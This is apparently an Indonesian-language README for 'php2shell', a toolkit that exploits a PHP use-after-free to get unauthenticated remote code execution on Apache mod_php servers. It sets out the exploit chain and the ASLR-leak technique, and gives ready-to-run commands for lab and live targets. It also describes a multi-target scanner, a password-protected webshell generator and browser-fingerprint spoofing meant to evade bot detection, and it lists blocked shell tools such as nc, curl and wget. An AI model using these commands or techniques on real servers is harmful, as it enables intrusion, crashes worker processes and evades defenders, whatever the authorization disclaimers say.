<div align="center">

<img src="gambar/screenshot_1.png" alt="php2shell in action" width="720">

# 💀 P H P 2 S H E L L

### Bukti konsep RCE tanpa login untuk PHP 5.4 → 8.4.26 (CVE-2026-109619)

*Pure HTTP · tanpa syarat di sisi target · JA3 fingerprint browser · proof-of-access*

[![PHP](https://img.shields.io/badge/PHP-5.4%20→%208.4.26-777BB4?style=flat-square&logo=php&logoColor=white)](https://www.php.net)
[![CVSS](https://img.shields.io/badge/CVSS%204.0-9.2%20Critical-cb2431?style=flat-square)](https://www.first.org/cvss/)
[![Tests](https://img.shields.io/badge/tests-81%20OK-brightgreen?style=flat-square)](#-verification)
[![License: GPL‑3.0](https://img.shields.io/badge/license-GPL--3.0-informational?style=flat-square)](LICENSE)

**[Mulai cepat](#-mulai-cepat-3-perintah) · [Mode](#-mode-apa-saja) · [Syarat target](#-kapan-rantai-ini-jalan) · [FAQ](#-faq)**

</div>

---

## ❖ Apa ini?

`php2shell` adalah toolkit riset untuk **CVE-2026-109619** (CVSS 4.0 **9.2 Critical**) —
bug *use-after-free* di engine PHP via `session.upload_progress`. Dalam bahasa sederhana:

> Dua request HTTP biasa, tanpa login, tanpa upload file, tanpa cookie — dan perintah
> `id` dieksekusi di server sebagai `www-data`.

**Yang dilakukan tool ini (dan tidak dilakukan):**

| ✅ Dilakukan | ⛔ Tidak dilakukan |
|---|---|
| Membuktikan RCE lewat perintah identitas (`id`, `whoami`, maks 14 byte) | Reverse shell — **tidak ada** di kode, diblokir di runner |
| Membaca hasil bukti otomatis di lab | Ekstraksi data / backdoor — pagar di level kode, tak bisa dimatikan flag |
| Deteksi versi & skor kesiapan (`detect`, `preflight`) | Menyerang CVE-2026-109618 — hanya dideteksi, tidak dieksploitasi |

**Versi rentan vs fix:**

| Branch | Terakhir rentan | Fix |
|---|---|---|
| 8.2 | 8.2.34 | **8.2.35** |
| 8.3 | 8.3.35 | **8.3.36** |
| 8.4 | 8.4.26 | **8.4.27** |
| 8.5 | 8.5.11 | **8.5.12** |
| ≤ 8.1 | semua (EOL, tanpa backport) | — |

---

## ❖ Cara kerjanya (3 langkah)

```text
① REQUEST A (producer)
   multipart 12MB → OOM di php_session_initialize()
   → PS(http_session_vars) jadi pointer menggantung
   → worker Apache (prefork) mati (SIGABRT)

② REQUEST B (consumer)
   prefork men-fork worker baru yang mewarisi heap yang sama
   → buffer multipart ukuran penyerang mengisi bekas pointer itu

③ Rantai destruktur PHP
   zval_ptr_dtor(PS(http_session_vars)) → destroy fake HashTable
   → pDestructor = zif_system → perintah dieksekusi
```

**ASLR dikalahkan lewat leak:** header `Set-Cookie` 4096-byte dari out-of-bounds
`php_url_encode()` membocorkan **Zend MM chunk base**; pembacaan basi kedua
membocorkan alamat `zval_ptr_dtor` → **libphp base** → semua offset resolve.

Rincian lengkap: [docs/SYARAT_TARGET.md](docs/SYARAT_TARGET.md).

---

## ❖ Install

```bash
git clone https://github.com/ArioVeisa/php2shell.git
cd php2shell
bash install.sh        # venv + deps + smoke test + command global `php2shell`
```

<details>
<summary>Manual (tanpa installer)</summary>

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt     # curl_cffi (JA3) + bcrypt (mode shell)
python php2shell.py --help
```

</details>

Keterangan tiap dependensi: **[REQUIREMENTS.md](REQUIREMENTS.md)**.

---

## ❖ Mulai cepat (3 perintah)

**1 — Nyalakan lab rentan (Docker, satu perintah):**

```bash
bash lab/lab_docker.sh start
# → image resmi php:8.4.26-apache, konfigurasi penulis
# → jalan di http://127.0.0.1:8095/index.php
```

**2 — Hitung offset binary (wajib setiap image berubah):**

```bash
python3 docker/offsets.py          # → out/offsets.env
```

**3 — Jalankan rantai + ambil bukti:**

```bash
php2shell exploit \
    -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
```

Hasil di terminal:

```text
PROOF (8.3s): uid=33(www-data)
```

Kenapa terbaca? `id>/out/p1` menulis hasil `id` ke file di dalam container,
folder itu di-mount ke host (`out/p1`), dan toolkit **membacanya otomatis**.

---

## ❖ Lab target vs live target

Dua dunia yang beda — perintahnya beda, harapannya beda.

### A) Lab lokal (`127.0.0.1`) — bukti penuh

```bash
php2shell exploit -u http://127.0.0.1:8095/index.php --force --yes \
    --exploit-profile bookworm -c 'id>/out/p1'
# → PROOF: uid=33(www-data)   ← output perintah TERBACA
```

### B) Live target — *blind by design*

```bash
php2shell detect    -u https://target.example/     # 1) recon, tanpa menyerang
php2shell preflight -u https://target.example/     # 2) skor kesiapan
php2shell exploit   -u https://target.example/ --yes -c 'id'   # 3) hanya dgn izin
# → stage selesai, tapi BLIND: perintah terkirim, output TIDAK sampai
```

`id>/out/p1` tidak berguna di live target — folder `/out` di server target tidak
di-mount ke mesinmu. Ini **keputusan desain**: toolkit sengaja tidak punya kanal
ekstraksi output di target asing. Bukti di live target = pola worker crash di log
server + stage-3 selesai, bukan isi perintah.

> ⚠️ **Sadari risikonya:** tiap percobaan membuat 1 worker Apache mati (SIGABRT)
> lalu di-fork ulang. Di server produksi = gangguan layanan + jejak log jelas +
> kemungkinan diblok WAF. Target asing **wajib punya izin tertulis** — tanpa itu
> ini kejahatan (UU ITE, US CFAA, dan padanannya di yurisdiksi lain).

---

## ❖ Mode apa saja?

```bash
php2shell.py scan      -l targets.txt    # banyak target sekaligus → laporan
php2shell.py detect    -u URL            # versi, SAPI, upload_progress (read-only)
php2shell.py preflight -u URL            # skor kesiapan exploit + hambatan
php2shell.py exploit   -u URL --yes      # rantai penuh 0→RCE
php2shell.py shell                       # generator webshell berpassword (bcrypt+TTL)
php2shell.py builds                      # tabel build: RCE / leak-saja / belum terbukti
php2shell.py version                     # cek update
```

**Alur kerja yang benar:** `detect` → `preflight` → baru `exploit`.
Deteksi bukan gerbang (CDN boleh menyembunyikan versi), tapi recon dulu
menghemat waktu dan menghindari tembakan buta.

### Flag yang paling sering dipakai

| Flag | Fungsi |
|---|---|
| `-u URL` / `-l FILE` | target tunggal / daftar target |
| `--yes` | wajib untuk exploit (konfirmasi sadar) |
| `--force` | lewati gerbang skor preflight (lab yang aman) |
| `--exploit-profile NAME` | profil offset build (mis. `bookworm`) |
| `-c 'CMD'` | perintah identitas, maks 14 byte |
| `--proof-file NAME` | `-c 'id>/out/NAME'` + baca hasilnya otomatis |
| `--ja3 {chrome,safari,firefox,edge,android}` | profil TLS+UA browser (default chrome) |
| `--proxy URL` | rutekan lewat proxy (mis. Burp `http://127.0.0.1:8080`) |
| `--audit FILE` | catat semua request ke JSONL |
| `--json / --csv FILE` | output laporan |
| `-v` / `--quiet` | verbose / senyap |

Semua flag: `php2shell --help`.

---

## ❖ Kapan rantai ini jalan?

Lima syarat sekaligus — satu gagal, rantai gagal:

| # | Syarat | Kenapa |
|---|---|---|
| 1 | PHP < 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 | di atasnya = patch, bug sudah hilang |
| 2 | Apache **mod_php + prefork** | FPM membunuh child saat startup gagal — state busuk tidak selamat |
| 3 | `session.upload_progress = On` + `cleanup = On` | primitive pemicunya |
| 4 | `post_max_size` ≥ 64M (+ `memory_limit` kecil, mis. 8M) | body harus OOM di tengah pemrosesan, bukan dibuang lebih awal |
| 5 | Offset cocok dengan build | salah offset = crash, bukan RCE |

**Yang sering dikira syarat tapi bukan** (dibantah pengujian di
[docs/SYARAT_TARGET.md](docs/SYARAT_TARGET.md)): `MaxRequestWorkers 1` —
rantai terbukti jalan di 150 worker stock; `KeepAlive Off` — membantu
determinisme, bukan syarat; `display_errors = On` — tidak wajib, probe
menangani mode `STDOUT`.

Endpoint target bisa sesederhana `<?php echo "OK\n"; ?>` — tidak butuh
`session_start()`, tidak butuh fitur upload.

**Exploit gagal dengan `HEAP_LEAK_FAILED`?** Bukan berarti target patched —
biasanya build-nya tidak terkalibrasi. Ukur `libphp.so` target, lalu kirim
offset manual dengan `--zif-offset` / `--dtor-offset`.

---

## ❖ Stealth / anti-bot

| Lapisan | Isi |
|---|---|
| TLS/JA3 | `curl_cffi` me-replay handshake browser asli (JA3+ALPN persis) |
| Profil identitas | `chrome`/`safari`/`firefox`/`edge`/`android`, UA + header konsisten |
| Timing | jeda antar request + jitter 0,75×–1,35× |
| Retry sopan | backoff eksponensial 2→4→8 detik |
| Audit | semua request tercatat JSONL (`--audit`) |

**Batas jujurnya:** ini lolos deteksi *script-vs-browser* klasik. Bot-management
berat (Cloudflare Bot Management, Akamai) yang mengecek HTTP/2 frame-order dan
riwayat cookie — bukan medan tool ini mengklaim menang.

---

## ❖ FAQ

<details>
<summary><b>Bisa dipakai ke semua website PHP?</b></summary>

Tidak. Butuh mod_php + Apache prefork, rentan versi, upload_progress aktif, dan
heap yang cocok dengan build terkalibrasi. php-fpm sebagian besar memitigasi bug
ini. Karena itu `detect` + `preflight` dijalankan dulu.
</details>

<details>
<summary><b>Kenapa tidak ada mode reverse shell?</b></summary>

Disengaja. Ini toolkit **proof-of-access**: membuktikan eksekusi dengan perintah
identitas. `sh`, `bash`, `nc`, `curl`, `wget`, `chmod`, `rm` diblokir di level
runner dan tidak bisa dibuka lewat flag mana pun. `--revshell` tidak ada di parser.
</details>

<details>
<summary><b>Boleh tambah perintah lain?</b></summary>

Bisa, dalam pagar: `--allow-cmd ls --allow-cmd df` memperluas whitelist ke daftar
tetap yang sudah direview (`uname`, `hostname`, `pwd`, `ls`, `cat`, `df`, `uptime`,
`who`, `w`, `env`). Chaining (`;`, `|`, `$(`, backtick) tetap mustahil.
</details>

<details>
<summary><b>Apa itu CVE-2026-109618, kenapa tidak dieksploitasi?</b></summary>

Bug kembar dari advisory yang sama (OOM bailout → korupsi state, bisa 1 request).
Toolkit ini hanya **mendeteksi** 109618; rantai penuh yang diimplementasikan
adalah 109619.
</details>

<details>
<summary><b>Legal atau tidak?</b></summary>

Leg **hanya** pada sistem milikmu sendiri atau dengan izin tertulis. Scan/eksploit
sistem orang lain = kejahatan di hampir semua yurisdiksi. Desain tool (perintah
identitas 14 byte, tanpa shell, tanpa eksfiltrasi) mengikuti batas itu.
</details>

---

## ❖ Verification

| Klaim | Bukti |
|---|---|
| RCE di `php:8.4.26-apache` resmi | `PROOF: uid=33(www-data)`, termasuk run percobaan tunggal |
| Engine rantai ≡ exploit acuan | diff byte-level — 7 fungsi inti, konstanta, orkestrasi identik |
| Patched 8.4.27 menolak rantai | lab regresi patched: consumer bersih |
| Pagar perintah | 16 test case negatif, ditolak **sebelum** network I/O |
| `--revshell` | diblokir level runner (exit 2), bukan cuma parser |
| Mode multi-target | dedupe, auto-https, JSON/CSV terverifikasi |
| 81 unit test | `python -m unittest discover -s tests -t .` → OK |

---

## ❖ Struktur repo

```text
php2shell/
├── php2shell.py          CLI utama: scan/detect/preflight/exploit/shell
├── install.sh            installer sekali-jalan (venv + deps + smoke test)
├── lib/
│   ├── chain.py          ENGINE: rantai exploit pure-python (in-process)
│   ├── transport.py      transport curl_cffi JA3 + rate limit + audit
│   ├── detect.py         fingerprint: versi, SAPI, upload_progress…
│   ├── preflight.py      skor kesiapan; deteksi ≠ gerbang
│   ├── build_support.py  tabel RCE / leak-saja / belum terbukti per build
│   ├── memprobe.py       baca memory_limit target via 1 request
│   ├── exploit_runner.py orkestrasi + pagar perintah + auto-proof
│   └── reporter.py       JSON / CSV / tabel terminal
├── shell/                generator webshell berpassword
├── lab/lab_docker.sh     lab rentan konfigurasi penulis, satu perintah
├── docker/               php.ini / apache.conf / www / offsets.py
├── docs/SYARAT_TARGET.md rincian syarat rantai
└── tests/                81 unit test
```

---

## ❖ Sumber & kredit

Repo ini bukan fork — turunan dari beberapa repo publik yang dibaca, diaudit,
lalu ditulis ulang. Riwayat audit forensik git penuh: [ATTRIBUTION.md](ATTRIBUTION.md).

**Penemu CVE:** Calif (Ryan A.) — temuan pertama 1 Agu 2026 ·
Wiz Research — temuan independen 19 Agu 2026 ·
OpenAI Codex Security (Amy Burnett) — vektor tambahan 18 Sep 2026

**Riset & kode acuan:** 9bie (Qi Deng) — exploit publik & heap grooming ·
Karasawa2025 — arah `display_errors=Off` · v.dir.mir — `--revshell` pada acuan ·
Zer061 — fork acuan `exploit.py` · ikow — verifikator OOM · devploit — tabel 13 profil heap

**Advisori:** PHP Group — [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) ·
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)

Kredit kurang atau keliru? Buka issue.

---

## ❖ Disclaimer — authorized use only

<div align="center">

Toolkit ini adalah **reproduksi defense-relevant** dari dua celah PHP yang
**sudah dipatch** — untuk riset, validasi blue-team, dan verifikasi patch.

**Gunakan hanya pada sistem milikmu atau dengan izin tertulis.**
Eksploitasi sistem pihak ketiga tanpa izin adalah kejahatan
(UU ITE Indonesia, US CFAA, dan padanannya).

**Lihat [SECURITY.md](SECURITY.md) · Lisensi [GPL-3.0-only](LICENSE)**

</div>
